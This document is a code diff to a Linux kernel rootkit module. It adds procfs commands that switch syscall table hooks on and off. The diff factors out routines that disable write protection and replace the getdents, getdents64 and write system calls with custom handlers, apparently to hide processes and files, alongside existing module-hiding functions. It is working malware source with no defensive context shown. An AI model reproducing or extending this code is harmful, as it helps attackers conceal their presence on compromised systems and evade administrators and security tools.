@@ -127,6 +127,10 @@ static ssize_t rtkit_write(struct file *file, const char __user *buffer,
 				module_hide();
 		} else if(!strncmp(buffer, SHOW_MOD_CMD, strlen(SHOW_MOD_CMD))) {
 				module_show();
+		} else if(!strncmp(buffer, HIDE_PID_CMD, strlen(HIDE_PID_CMD))) {
+				new_systable();
+		} else if(!strncmp(buffer, SHOW_PID_CMD, strlen(SHOW_PID_CMD))) {
+				old_systable();
 		}
 		return count;
 }
@@ -171,6 +175,28 @@ static void procfs_clean(void)
 		}
 }
 
+static void new_systable(void)
+{
+		/* Making sys_call_table read/write */
+		GPF_DISABLE();
+		syscall_table[__NR_getdents64] = (long)custom_getdents64;
+		syscall_table[__NR_getdents] = (long)custom_getdents;
+		syscall_table[__NR_write] = (long)custom_write;
+		/* sys_call_table back to read-only */
+		GPF_ENABLE();
+}
+
+static void old_systable(void)
+{
+		/* Making sys_call_table read/write */
+		GPF_DISABLE();
+		syscall_table[__NR_write] = (long)original_write;
+		syscall_table[__NR_getdents] = (long)original_getdents;
+		syscall_table[__NR_getdents64] = (long)original_getdents64;
+		/* sys_call_table back to read-only */
+		GPF_ENABLE();
+}
+
 /* Init function, called when the module is loaded */
 static int __init rootkit_init(void)
 {
@@ -184,13 +210,7 @@ static int __init rootkit_init(void)
         original_getdents64 = (void*)syscall_table[__NR_getdents64];
         original_getdents = (void*)syscall_table[__NR_getdents];
         original_write = (void*)syscall_table[__NR_write];
-        /* Making sys_call_table read/write */
-        GPF_DISABLE();
-        syscall_table[__NR_getdents64] = (long)custom_getdents64;
-        syscall_table[__NR_getdents] = (long)custom_getdents;
-        syscall_table[__NR_write] = (long)custom_write;
-        /* sys_call_table back to read-only */
-        GPF_ENABLE();
+        new_systable();
 		return 0;
 }
 
@@ -200,13 +220,7 @@ static void __exit rootkit_exit(void)
 		module_show();
 		procfs_clean();
 		module_hide();
-        /* Making sys_call_table read/write */
-        GPF_DISABLE();
-        syscall_table[__NR_write] = (long)original_write;
-        syscall_table[__NR_getdents] = (long)original_getdents;
-        syscall_table[__NR_getdents64] = (long)original_getdents64;
-        /* sys_call_table back to read-only */
-        GPF_ENABLE();
+        old_systable();
 		printk(KERN_INFO "Closing rootkit\n");
 }
 
